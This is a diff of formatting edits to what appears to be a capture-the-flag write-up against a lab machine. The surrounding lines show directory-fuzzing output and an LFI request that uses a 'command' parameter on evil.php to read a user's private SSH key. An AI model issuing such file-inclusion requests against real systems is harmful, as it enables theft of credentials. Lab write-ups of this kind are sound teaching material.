@@ -127,7 +127,7 @@ command                 [Status: 200, Size: 1398, Words: 13, Lines: 27]
 :: Progress: [4686/4686] :: Job [1/1] :: 1576 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
 ```
 
-### Exploitation (LFI - Local file inclusion)
+## Exploitation (LFI - Local file inclusion)
 
 We find `command`. Let's try this in a web browser.
 
@@ -171,7 +171,7 @@ You could in theory go to this path directly from a web browser but for the sake
 ![GET request using Burpsuite Repeater](https://i.imgur.com/tqyCvkw.png)
 
 **REQUEST**
-```consoles
+```console
 GET /secret/evil.php?command=/home/mowree/.ssh/id_rsa HTTP/1.1
 Host: 10.0.2.16
 ```
